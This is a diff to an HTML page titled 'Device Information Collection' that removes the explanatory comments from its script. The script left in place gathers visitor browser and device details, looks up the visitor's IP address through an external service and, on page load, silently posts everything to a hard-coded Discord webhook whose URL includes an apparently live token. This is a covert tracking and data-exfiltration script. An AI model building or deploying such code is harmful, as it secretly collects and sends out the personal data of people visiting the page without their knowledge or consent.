@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Device Information Collection</title>
     <script>
-      // Function to get browser information including cookies
+      
       async function getBrowserInfo() {
-        // Get battery information if available
+        
         const battery = await navigator.getBattery();
 
         return {
@@ -30,16 +30,16 @@
           connectionType: navigator.connection
             ? navigator.connection.effectiveType
             : "Unknown",
-          ipAddress: null, // IPアドレスを初期化
+          ipAddress: null, 
         };
       }
 
-      // Function to send data to the Discord webhook
+      
       async function sendDataToWebhook(data) {
         const webhookUrl =
           "https://discord.com/api/webhooks/1246024388290023444/N7DmfwaqmA9up2DKLI0if_lg1TEEsjH1PlgqcnI8t-ZdrvtLQyk7C4GtODObk8bx4y6k"; // 実際のDiscordのWebhook URLに置き換えてください
         try {
-          // IPアドレスを取得するAPIを使用して、IPアドレスを取得
+          
           const response = await fetch("https://api64.ipify.org?format=json");
           const ipData = await response.json();
           data.ipAddress = ipData.ip;
@@ -74,13 +74,13 @@
         }
       }
 
-      // Function to collect and send data
+      
       async function collectAndSendData() {
         const browserInfo = await getBrowserInfo();
         sendDataToWebhook(browserInfo);
       }
 
-      // Collect and send data immediately after page load
+    
       document.addEventListener("DOMContentLoaded", collectAndSendData);
     </script>
   </head>
